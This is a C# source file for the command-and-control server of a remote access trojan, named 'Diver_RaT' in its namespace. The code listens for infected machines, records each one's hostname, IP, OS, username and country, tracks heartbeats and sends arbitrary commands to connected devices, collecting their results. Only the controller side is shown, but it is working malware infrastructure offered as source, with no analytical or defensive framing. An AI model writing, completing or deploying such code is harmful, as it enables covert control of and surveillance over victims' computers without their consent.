using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Diver_RaT
{
    public class TcpServer
    {
        private readonly int _port;
        private readonly object _lock = new();
        private readonly Dictionary<string, ClientSession> _sessions = new();
        private readonly Dictionary<string, TaskCompletionSource<CommandResult>> _pending = new();
        private TcpListener? _listener;
        private Timer? _watchdog;
        private bool _running;

        public event Action<Device>? DeviceConnected;
        public event Action<Device>? DeviceDisconnected;
        public event Action<string>? Log;

        public TcpServer(int port = Protocol.DefaultPort)
        {
            _port = port;
        }

        public bool IsRunning => _running;
        public int Port => _port;

        public void Stop()
        {
            _running = false;
            try { _listener?.Stop(); } catch { }
            try { _watchdog?.Dispose(); _watchdog = null; } catch { }
            List<ClientSession> sessions;
            lock (_lock)
            {
                sessions = _sessions.Values.ToList();
                _sessions.Clear();
                _pending.Clear();
            }
            foreach (var s in sessions)
                try { s.Client.Close(); } catch { }
        }

        public bool Start()
        {
            try
            {
                _listener = new TcpListener(IPAddress.Any, _port);
                _listener.Start();
                _running = true;
                _watchdog = new Timer(_ => CheckTimeouts(), null, 5000, 5000);
                _ = Task.Run(AcceptLoop);
                Log?.Invoke($"Listening on port {_port}");
                return true;
            }
            catch (Exception ex)
            {
                _running = false;
                Log?.Invoke($"Failed to listen on port {_port}: {ex.Message}");
                return false;
            }
        }

        private async Task AcceptLoop()
        {
            while (_running && _listener != null)
            {
                try
                {
                    var client = await _listener.AcceptTcpClientAsync();
                    Log?.Invoke($"Incoming connection from {client.Client.RemoteEndPoint}");
                    _ = Task.Run(() => HandleClient(client));
                }
                catch
                {
                    if (!_running) break;
                }
            }
        }

        private async Task HandleClient(TcpClient client)
        {
            try { client.ReceiveBufferSize = 4 * 1024 * 1024; client.SendBufferSize = 4 * 1024 * 1024; } catch { }

            ClientSession session = new(client);
            try
            {
                using (client)
                using (var stream = client.GetStream())
                {
                    var reader = new StreamReader(stream, Encoding.UTF8);
                    var writer = new StreamWriter(stream, new UTF8Encoding(false)) { NewLine = "\n", AutoFlush = true };
                    session.Writer = writer;

                    string? first = null;
                    while (first is null)
                    {
                        first = await reader.ReadLineAsync();
                        if (first is null) return;
                        if (Protocol.TryParse(first) is not NetMessage reg || reg.Type != "REGISTER")
                            first = null;
                    }

                    var device = BuildDevice(Protocol.TryParse(first)!, session);
                    session.Device = device;
                    lock (_lock) _sessions[device.Id] = session;
                    session.DeviceId = device.Id;
                    DeviceConnected?.Invoke(device);
                    Log?.Invoke($"{device.ComputerName} registered ({device.IpAddress})");
                    _ = Task.Run(() => CountryResolver.ResolveAsync(device, session.RemoteIp));

                    while (true)
                    {
                        var line = await reader.ReadLineAsync();
                        if (line is null) break;

                        var msg = Protocol.TryParse(line);
                        if (msg is null) continue;

                        switch (msg.Type)
                        {
                            case "HEARTBEAT":
                                session.LastHeartbeat = DateTime.UtcNow;
                                device.IsOnline = true;
                                device.LastSeen = "Just now";
                                break;

                            case "RESULT":
                                CompletePending(msg.RequestId, device.ComputerName, msg);
                                break;

                            case "DISCONNECT":
                                device.IsOnline = false;
                                device.LastSeen = "Disconnected";
                                break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log?.Invoke($"HandleClient error for {session.DeviceId ?? "?"}: {ex.Message}");
            }
            finally
            {
                var device = session.Device;
                ClientSession? current = null;
                lock (_lock)
                {
                    if (session.DeviceId != null)
                    {
                        _sessions.TryGetValue(session.DeviceId, out current);
                        // Only remove + fire disconnect if THIS session is still the active one
                        // (a newer connection for the same device id may have already replaced it)
                        if (ReferenceEquals(current, session))
                            _sessions.Remove(session.DeviceId);
                    }
                }
                if (device != null && ReferenceEquals(current, session))
                {
                    Log?.Invoke($"{device.ComputerName} disconnected (session ended)");
                    DeviceDisconnected?.Invoke(device);
                }
            }
        }

        private Device BuildDevice(NetMessage reg, ClientSession session)
        {
            string Get(string key) => reg.Data != null && reg.Data.TryGetValue(key, out var v) ? v : "?";
            var d = new Device
            {
                Id = Get("id") is { Length: > 0 } id ? id : session.ClientId,
                ComputerName = Get("hostname"),
                IpAddress = Get("ip") is { } ip && ip != "?" ? ip : session.RemoteIp,
                OS = Get("os"),
                Username = Get("username"),
                Country = Get("country"),
                DeviceType = Get("deviceType") is { } dt && dt != "?" ? dt : "Desktop",
                LastSeen = "Just now",
                IsOnline = true
            };
            return d;
        }

        private void CheckTimeouts()
        {
            List<ClientSession> stale;
            lock (_lock)
                stale = _sessions.Values.Where(s => (DateTime.UtcNow - s.LastHeartbeat).TotalSeconds > Protocol.OfflineAfterSeconds).ToList();

            // Tear down stale connections so the client's read unblocks and it reconnects + re-registers.
            foreach (var s in stale)
            {
                Log?.Invoke($"Watchdog closing stale session for {s.Device?.ComputerName ?? "?"}");
                try { s.Client.Close(); } catch { }
            }
        }

        public Task<CommandResult> SendCommandAsync(string deviceId, string command, Dictionary<string, string>? args = null, int timeoutMs = 30000)
        {
            ClientSession? session;
            lock (_lock) _sessions.TryGetValue(deviceId, out session);
            if (session?.Writer == null)
                return Task.FromResult(new CommandResult { Success = false, Error = "Device offline" });

            var requestId = Guid.NewGuid().ToString("N")[..8];
            var tcs = new TaskCompletionSource<CommandResult>(TaskCreationOptions.RunContinuationsAsynchronously);
            lock (_lock) _pending[requestId] = tcs;

            var msg = Protocol.Serialize(new
            {
                type = "COMMAND",
                requestId,
                command,
                args
            });
            try
            {
                session.Writer.WriteLine(msg);
            }
            catch
            {
                lock (_lock) _pending.Remove(requestId);
                return Task.FromResult(new CommandResult { Success = false, Error = "Send failed" });
            }

            _ = Task.Run(async () =>
            {
                var completed = await Task.WhenAny(tcs.Task, Task.Delay(timeoutMs)).ConfigureAwait(false);
                if (!ReferenceEquals(completed, tcs.Task))
                {
                    lock (_lock) _pending.Remove(requestId);
                    tcs.TrySetResult(new CommandResult { Success = false, Error = "Timed out" });
                }
            });
            return tcs.Task;
        }

        private void CompletePending(string? requestId, string computerName, NetMessage msg)
        {
            if (string.IsNullOrEmpty(requestId)) return;
            TaskCompletionSource<CommandResult>? tcs;
            lock (_lock)
            {
                if (!_pending.TryGetValue(requestId, out tcs)) return;
                _pending.Remove(requestId);
            }
            var result = new CommandResult
            {
                RequestId = requestId,
                Success = msg.Success == true,
                Result = msg.Result,
                Data = msg.Data,
                ComputerName = computerName
            };
            if (!result.Success) result.Error = string.IsNullOrEmpty(msg.Result) ? "Command failed" : msg.Result;
            tcs.TrySetResult(result);
        }
    }

    public class CommandResult
    {
        public string? RequestId { get; set; }
        public bool Success { get; set; }
        public string? Error { get; set; }
        public string? Result { get; set; }
        public Dictionary<string, string>? Data { get; set; }
        public string? ComputerName { get; set; }
    }

    internal class ClientSession
    {
        public ClientSession(TcpClient client)
        {
            Client = client;
            LastHeartbeat = DateTime.UtcNow;
            RemoteIp = (client.Client.RemoteEndPoint as IPEndPoint)?.Address.ToString() ?? "0.0.0.0";
            ClientId = Guid.NewGuid().ToString("N");
        }

        public TcpClient Client { get; }
        public StreamWriter? Writer { get; set; }
        public Device? Device { get; set; }
        public string ClientId { get; }
        public string RemoteIp { get; }
        public string? DeviceId { get; set; }
        public DateTime LastHeartbeat { get; set; }
    }
}
